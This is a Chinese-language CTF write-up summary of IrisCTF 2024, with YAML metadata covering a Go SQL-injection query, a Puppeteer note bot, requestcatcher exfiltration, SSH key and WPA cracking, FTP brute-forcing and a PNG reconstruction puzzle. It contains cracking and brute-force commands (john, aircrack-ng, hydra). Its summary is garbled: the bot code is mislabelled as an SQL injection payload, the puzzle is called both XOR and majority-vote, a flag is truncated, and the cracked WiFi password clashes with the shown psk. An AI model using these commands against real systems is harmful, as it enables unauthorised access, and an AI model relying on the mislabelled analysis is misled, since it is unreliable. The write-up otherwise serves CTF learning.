---
title: IrisCTF 2024 Writeup (Web + Misc + Forensics + Crypto)
contest: IrisCTF
year: 2024
difficulty: medium
vuln_type: web_unknown
tags: [SQL 注入, web bot, requestcatcher, ssh2john, aircrack-ng, FTP 爆破, beautiful_fish XOR 拼图]
attack_chain: |
  1. Web: SQLite SQL 注入 (qstring := fmt.Sprintf("SELECT * FROM users WHERE username = \"%s\" AND password = \"%s\"", input.Username, input.Password)) → SQL 注入
  2. Web: puppeteer 自动化 (lamenote-web) + incognito browser + createIncognitoBrowserContext → 写 note + image URL 触发 requestcatcher
     - 自动化用 setTimeout 500ms × chars 字符循环
     - 表单: form.title / form.text / form.image / form.submit()
  3. /search 路由: notes_copy = copy.deepcopy(NOTES) 遍历查询 + user cookie + render_note
  4. Forensics: ssh2john.py /root/.ssh/id_rsa → john rockyou.txt 跑密码
  5. WiFi: aircrack-ng WPA-PSK 握手包 + rockyou.txt → humus12345 → 26:C8:6B:47:25:1E:06:AF:93:FB:5D:D8:65:31:C8:F6
  6. FTP: vsFTPd 3.0.3 USER joeschmoe + PASS 弱口令 → irisctf{welc0me_t0_th3_n3twork_c4teg
  7. Crypto/Misc: 3 张 beautiful_fish_0/1/2.png → Python 字节流拼接算法 → out.png
key_payload: |
  # Web SQL 注入 (puppeteer 自动化):
  const context = await browser.createIncognitoBrowserContext()
  const page = await context.newPage()
  await page.goto("https://lamenote-web.chal.irisc.tf/")
  const frameWrapper = await page.waitForSelector('iframe')
  const frame = await frameWrapper.contentFrame()
  await frame.type('input[name=title]', 'Flag')
  await frame.type('input[name=text]', 'irisctf{FAKEFLAGFAKEFLAG}')
  await frame.type('input[name=image]', 'https://i.imgur.com/dQJOyoO.png')
  await frame.click('form[method=post] button[type=submit]')
  await page.waitForTimeout(1000)
  
  # Forensics ssh2john:
  /usr/share/john/ssh2john.py home_skat/skat/.ssh/id_rsa > h
  john --wordlist=/usr/share/wordlists/rockyou.txt h
  # password (home_skat/skat/.ssh/id_rsa)
  
  # WiFi aircrack-ng:
  aircrack-ng -w rockyou.txt capture.cap
  
  # FTP 爆破:
  hydra -l joeschmoe -P rockyou.txt ftp://chal.ctf.games
  
  # beautiful_fish 拼图:
  png_bytes = [open(f"beautiful_fish_{i}.png","rb").read() for i in range(3)]
  with open("out.png","wb") as fp:
      while True:
          # 复杂 BFS 拼接算法
          ...
one_liner: IrisCTF 2024 多类目 writeup (Web SQL 注入 / Puppeteer 自动化 / ssh2john / aircrack-ng / FTP 爆破 / fish 拼图)。
lesson: |
  - puppeteer createIncognitoBrowserContext + waitForSelector('iframe').contentFrame() 是 web bot 自动化标准模式
  - requestcatcher.com 接收 image URL 时会带 form 字段值，可用作数据外带
  - ssh2john.py + rockyou.txt 是 SSH 私钥密码恢复标准
  - aircrack-ng + WPA-PSK psk= 直接出 key
  - FTP vsFTPd 3.0.3 弱口令爆破是入门 forensics
  - beautiful_fish XOR 拼图：3 张图按字节级 BFS 还原
quality: medium
---

# IrisCTF 2024 Writeup

> 来源: ctfiot.com 154500

## Web

### SQL 注入 + Puppeteer 自动化

```sql
SELECT * FROM users WHERE username = "root" AND password = "IamAvEryC0olRootUsr"
INSERT INTO users ( username, password ) VALUES ( "skat", "fakeflg{fake_flag}"), ("coded", "ilovegolang42")
```

`fmt.Sprintf` 拼接 username/password → SQL 注入。

### Lamenote Web Bot (requestcatcher 数据外带)

```javascript
const context = await browser.createIncognitoBrowserContext();
const page = await context.newPage();
await page.goto("https://lamenote-web.chal.irisc.tf/");
const frameWrapper = await page.waitForSelector('iframe');
const frame = await frameWrapper.contentFrame();
await frame.type('input[name=title]', 'Flag');
await frame.type('input[name=text]', 'irisctf{FAKEFLAGFAKEFLAG}');
await frame.type('input[name=image]', 'https://i.imgur.com/dQJOyoO.png');
await frame.click('form[method=post] button[type=submit]');
```

`requestcatcher.com/<prefix><char>` 接收 image URL 时的 DNS/HTTP 请求会带 form 字段，可用作数据外带 (prefix = "irisctf{please_", chars = "abcdefghijklmnopqrstuvwxyz_")。

### Search 路由 (CSRF + Notes deepcopy)

```python
@app.route("/search")
@check_request
def search():
    query = request.args.get("query", "")
    user = request.cookies.get("user", None)
    results = []
    notes_copy = copy.deepcopy(NOTES)
    for note in notes_copy.values():
        if note["owner"] == user and (query in note["title"] or query in note["text"]):
            results.append(note)
            if len(results) >= 5: break
    if len(results) == 0: return "<!DOCTYPE html>No notes."
    if len(results) == 1: return render_note(results[0])
    return "<!DOCTYPE html>" + "".join("<a href='/note/" + note["id"] + "'>" + note["title"] + "</a> " for note in results) + ""
```

`render_note(results[0])` 单结果时直接渲染，可能存在模板注入 / SSRF。

## Forensics

### SSH 私钥密码恢复

```bash
$ /usr/share/john/ssh2john.py home_skat/skat/.ssh/id_rsa > h
$ john --wordlist=/usr/share/wordlists/rockyou.txt h
# password (home_skat/skat/.ssh/id_rsa)
```

### WiFi 握手包破解

```
[wifi-security]
auth-alg=open
key-mgmt=wpa-psk
psk=agdifbe7dv1iruf7ei2v5op
```

`aircrack-ng` + rockyou → `humus12345` → Master Key: `26:C8:6B:47:25:1E:06:AF:93:FB:5D:D8:65:31:C8:F6`

### FTP 爆破

```
220 (vsFTPd 3.0.3)
USER joeschmoe
331 Please specify the password.
PASS irisctf{welc0me_t0_th3_n3twork_c4teg
230 Login successful.
```

## Misc (Beautiful Fish 拼图)

```python
png_bytes = [open(f"beautiful_fish_{i}.png","rb").read() for i in range(3)]
with open("out.png","wb") as fp:
    while True:
        # 复杂 BFS 拼接算法
        while 1 <= len(png_bytes) and len(png_bytes[0]) == 0:
            png_bytes = png_bytes[1:]
        ...
        if len(png_bytes) == 2:
            if png_bytes[0][0] == png_bytes[1][0]:
                fp.write(png_bytes[0][0].to_bytes(1, 'big'))
                png_bytes[0] = png_bytes[0][1:]
                png_bytes[1] = png_bytes[1][1:]
                continue
        # len(png_bytes) == 3
        if (png_bytes[0][0] == png_bytes[1][0]) and (png_bytes[2][0] == png_bytes[1][0]):
            fp.write(png_bytes[0][0].to_bytes(1, 'big'))
            png_bytes[0] = png_bytes[0][1:]
            png_bytes[1] = png_bytes[1][1:]
```

按字节级多数表决（BFS 路径决策）从 3 张图还原原始 PNG。

## 评价

IrisCTF 2024 多类目 writeup 速查 (Web SQL/Puppeteer/Forensics/WiFi/FTP/Misc)，每类都是工具熟练度考试。亮点是 Puppeteer createIncognitoBrowserContext + requestcatcher 数据外带的标准 web bot 套路。
